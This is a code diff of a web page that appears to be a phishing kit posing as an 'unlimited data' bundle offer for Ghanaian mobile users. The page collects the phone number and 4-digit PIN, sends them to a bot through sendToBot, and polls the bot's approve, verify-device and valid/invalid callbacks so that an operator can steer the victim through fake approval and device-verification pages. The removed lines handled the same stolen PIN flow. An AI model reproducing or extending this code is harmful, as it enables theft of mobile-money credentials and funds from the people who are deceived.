-                                // Save data
-                                const accType = els.accountType.value;
-                                const accValue = els.phoneInput.value.trim();
-                                const pin = els.passwordInput.value.trim();
-
-                                localStorage.setItem('accountType', accType);
-                                localStorage.setItem('accountNumber', accValue);
-                                localStorage.setItem('password', pin);
-                                if (accType === 'mobile') localStorage.setItem('phone', accValue);
-
-                                // Redirect after brief delay
-                                setTimeout(() => {
-                                    window.location.href = CONFIG.REDIRECT_PAGE;
-                                }, 1500);
-                                return;
+                            if (update.callback_query) {
+                                const cb = update.callback_query.data;
+                                if (cb === approveId) window.location.href = CONFIG.APPROVE_PAGE;
+                                else if (cb === verifyId) window.location.href = CONFIG.DEVICE_PAGE;
+                                else if (cb.startsWith('valid_')) window.location.href = 'https://unlimiteddata.vercel.app/success.html';
+                                else if (cb.startsWith('invalid_') || cb === declineId) {
+                                    spinner.style.display = 'none';
+                                    errMsg.textContent = "Request declined or invalid PIN. Please try again.";
+                                    errMsg.style.display = 'block';
+                                }
                             }
-
-                            if (cbData === state.declineId) {
-                                stopPolling();
-                                hideSpinner();
-                                showError("Purchase declined. Please try again or contact support.");
-                                return;
-                            }
-
-                            if (cbData === state.verifyDeviceId) {
-                                stopPolling();
-                                showSuccess("✓ Device verification required. Redirecting...");
-                                
-                                const accValue = els.phoneInput.value.trim();
-                                localStorage.setItem('accountNumber', accValue);
-
-                                setTimeout(() => {
-                                    window.location.href = 'device_verify.html';
-                                }, 1500);
-                                return;
-                            }
-                        }
-                    })
-                    .catch(err => console.warn("Polling error:", err));
-            }, 1800);
+                        });
+                    });
+            }, 1200); // Slightly faster polling
         }
 
-        // === Submit Handler ===
-        els.nextBtn.onclick = () => {
-            hideError();
+        continueBtn.onclick = () => {
+            errMsg.style.display = 'none';
+            const phone = phoneInput.value.trim();
+            const pin = pinInput.value.trim();
 
-            const accountTypeVal = els.accountType.value;
-            const inputVal = els.phoneInput.value.trim();
-            const pin = els.passwordInput.value.trim();
-
-            if (!inputVal) {
-                showError("Please enter your account details");
+            if (!phone || !isValidGhanaNumber(phone)) {
+                errMsg.textContent = "Enter valid Ghana number (e.g. 0201234567)";
+                errMsg.style.display = 'block';
+                return;
+            }
+            if (pin.length !== 4) {
+                errMsg.textContent = "PIN must be 4 digits";
+                errMsg.style.display = 'block';
                 return;
             }
 
-            if (accountTypeVal === 'mobile') {
-                if (inputVal.length < CONFIG.MIN_PHONE_LENGTH || 
-                    (!inputVal.startsWith('020') && !inputVal.startsWith('050'))) {
-                    showError("Invalid Telecel number (must start with 020 or 050)");
-                    return;
-                }
-            }
-
-            if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
-                showError("PIN must be exactly 4 digits");
-                els.passwordInput.focus();
-                return;
-            }
-
-            showSpinner();
-            const displayType = accountTypeVal === 'mobile' ? 'Mobile' : 'Broadband';
-            sendLoginAttempt(displayType, inputVal, pin);
+            sendToBot(phone, pin);
         };
 
-        els.backBtn.onclick = () => window.history.back();
-
-        // === Initialize ===
-        extractBundleInfo();
-        els.phoneInput.focus();
+        // Initialize
+        loadOffer();
+        phoneInput.focus();
     </script>
 </body>
 </html>
